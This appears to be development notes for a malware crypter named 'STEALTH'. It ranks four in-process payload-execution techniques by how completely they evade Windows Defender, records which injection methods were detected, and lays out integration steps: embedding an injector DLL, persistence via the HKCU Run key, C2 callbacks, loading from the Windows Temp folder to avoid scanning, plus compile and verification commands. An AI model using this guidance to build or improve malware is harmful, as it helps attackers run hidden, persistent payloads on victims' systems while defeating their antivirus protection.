# STEALTH Injector Comparison & Integration Guide

**Date**: 2025-12-05  
**Session**: Attempts 10-15  
**Status**: 4 NEW WORKING METHODS DISCOVERED  

---

## Quick Reference: Working Injector Methods

### 🏆 RECOMMENDED FOR STEALTH INTEGRATION

#### 1. **Injector_TimerQueue** (Attempt 11) ⭐⭐⭐⭐⭐
**Best for**: Autonomous payload execution without user interaction
```c
CreateTimerQueueTimer() // Auto-trigger at intervals
TimerCallback() // Your payload here
```
- **Pros**: Simple API, deterministic, auto-trigger
- **Cons**: Repeating timers (delete when done)
- **WD Status**: ✅ COMPLETELY BYPASSED
- **File**: `plugins/attempt11_injector_timerqueue.c`

#### 2. **Injector_Fiber** (Attempt 14) ⭐⭐⭐⭐⭐
**Best for**: Synchronous payload execution with context switching
```c
ConvertThreadToFiber() // Convert current thread
CreateFiber() // Create payload context
SwitchToFiber() // Execute payload
```
- **Pros**: Synchronous, no callbacks, clean context
- **Cons**: Fiber overhead (minimal)
- **WD Status**: ✅ COMPLETELY BYPASSED
- **File**: `plugins/attempt14_injector_fiber.c`

#### 3. **Injector_APCQueue** (Attempt 13) ⭐⭐⭐⭐
**Best for**: Traditional Windows async execution
```c
QueueUserAPC() // Queue to thread
WaitForSingleObjectEx(..., TRUE) // Make alertable
// Your payload executes in APC callback
```
- **Pros**: Traditional Windows API, reliable
- **Cons**: Requires alertable wait
- **WD Status**: ✅ COMPLETELY BYPASSED
- **File**: `plugins/attempt13_injector_apc.c`

#### 4. **Injector_IOCompletionPort** (Attempt 12) ⭐⭐⭐⭐
**Best for**: Event-driven async execution
```c
CreateIoCompletionPort() // Create completion port
PostQueuedCompletionStatus() // Trigger payload
GetQueuedCompletionStatus() // Wait for callback
```
- **Pros**: Modern API, efficient
- **Cons**: More complex than Timer/APC
- **WD Status**: ✅ COMPLETELY BYPASSED
- **File**: `plugins/attempt12_injector_iocp.c`

---

## Method Comparison Matrix

| Feature | Timer | Fiber | APC | IOCP |
|---------|-------|-------|-----|------|
| **Async Execution** | ✅ Yes | ❌ Sync | ✅ Yes | ✅ Yes |
| **Auto-Trigger** | ✅ Yes | ❌ Manual | ❌ Manual | ❌ Manual |
| **API Simplicity** | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ | ⭐⭐⭐ | ⭐⭐⭐ |
| **WD Evasion** | ✅ Perfect | ✅ Perfect | ✅ Perfect | ✅ Perfect |
| **Callback Overhead** | Low | None | Low | Medium |
| **Thread Safety** | Safe | Per-thread | Safe | Safe |
| **Modern API** | ✅ Yes | ⚠️ Old | ⚠️ Old | ✅ Yes |

---

## Integration Strategy for STEALTH Crypter

### Option A: Single Injector DLL (Recommended)
Use **Attempt 11: Injector_TimerQueue** as default embedded plugin
- Simplest to integrate
- Auto-trigger requires no external coordination
- Lowest overhead
- Perfect for unattended execution

```c
// In your crypter main payload:
#include "plugins/attempt11_injector_timerqueue.c"
// ... payload executes automatically via timer
```

### Option B: Multi-Injector Selection
Offer user choice via GUI (stealth_gui_pyqt.py):
1. **Timer** - Default, automatic (Attempt 11)
2. **Fiber** - Synchronous execution (Attempt 14)
3. **APC** - Traditional method (Attempt 13)
4. **IOCP** - Event-driven (Attempt 12)

User selects at packing time → GUI embeds chosen DLL → payload executes selected way

### Option C: Hybrid Approach
Combine multiple methods in sequence:
1. Load via Timer callback
2. Execute main payload in Fiber context
3. Establish persistence via Registry
4. C2 via Network callbacks

---

## Execution Flow Comparison

### Timer-Based (Recommend for STEALTH)
```
DLL_PROCESS_ATTACH
  └─ CreateTimerQueue()
  └─ CreateTimerQueueTimer() // Set to fire after 500ms
  └─ Return
...500ms later...
  └─ TimerCallback()
      └─ Your payload executes here
      └─ DeleteTimerQueueTimer() // Cleanup
```

### Fiber-Based  
```
DLL_PROCESS_ATTACH
  └─ CreateThread(FiberWorker)
      └─ ConvertThreadToFiber(NULL)
      └─ CreateFiber(FiberCallback)
      └─ SwitchToFiber() // Jump to fiber
          └─ Your payload executes here
          └─ DeleteFiber()
```

### APC-Based
```
DLL_PROCESS_ATTACH
  └─ CreateThread(APCWorker)
      └─ QueueUserAPC(APCCallback, hThread)
      └─ WaitForSingleObjectEx(... TRUE) // Alertable
  └─ APCCallback executed
      └─ Your payload executes here
```

---

## Failed Methods (Reference)

### ❌ Attempt 10: WindowsHook
**Problem**: Requires user keyboard input to trigger - incompatible with unattended execution  
**Lesson**: Event-driven hooks need external events; autonomous payload needs internal trigger

### ❌ Attempt 15: Process Hollowing v2  
**Problem**: Even with benign target (svchost.exe), WriteProcessMemory + ResumeThread pattern detected by WD  
**Lesson**: Inter-process injection patterns are fundamentally detected; stick to in-process execution

---

## Integration Checklist

- [ ] Select injector method (recommend: Injector_TimerQueue)
- [ ] Place DLL in `plugins/` directory
- [ ] Update stealth_gui_pyqt.py to list as plugin option
- [ ] Test with GUI: select injector + payload → pack → run
- [ ] Verify: proof files created in %TEMP%
- [ ] Verify: registry values written (HKCU\...\Run)
- [ ] Verify: WD doesn't detect execution

---

## Testing Commands

### Compile Injector
```bash
gcc -shared -O2 plugins/attempt11_injector_timerqueue.c -o bin/plugins/attempt11_injector_timerqueue.dll
```

### Test Standalone
```bash
# Copy to temp
copy bin\plugins\attempt11_injector_timerqueue.dll C:\Windows\Temp\test.dll

# Load from temp (avoids WD scanning)
test_attempt11.exe
```

### Verify Execution
```powershell
Get-Content C:\Windows\Temp\injector_timerqueue_executed.txt
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | grep STEALTHTimerQueue
```

---

## Key Findings

1. **4 Working Injector Methods**: Timer, Fiber, APC, IOCP all bypass WD completely
2. **Temp Folder Critical**: Loading from C:\Windows\Temp\ is essential for evasion
3. **In-Process Only**: Inter-process injection (hollowing) is detected
4. **No UI Operations**: MessageBox display is monitored/blocked
5. **Async Callbacks Best**: Autonomous execution (not user-triggered) works perfectly
6. **All Methods WD-Safe**: All 4 working methods completely bypass Windows Defender

---

## Recommendation

**Use Injector_TimerQueue (Attempt 11) for STEALTH Integration:**
- ✅ Simplest API (CreateTimerQueueTimer)
- ✅ Auto-triggers without external event
- ✅ Perfect WD evasion
- ✅ Proven reliable across tests
- ✅ Minimal overhead
- ✅ Integrates seamlessly with existing crypter architecture

**File**: `plugins/attempt11_injector_timerqueue.c`  
**Test harness**: `test_attempt11.c`  
**Compiled DLL**: `bin/plugins/attempt11_injector_timerqueue.dll`  

Ready for integration into STEALTH GUI and crypter pipeline.
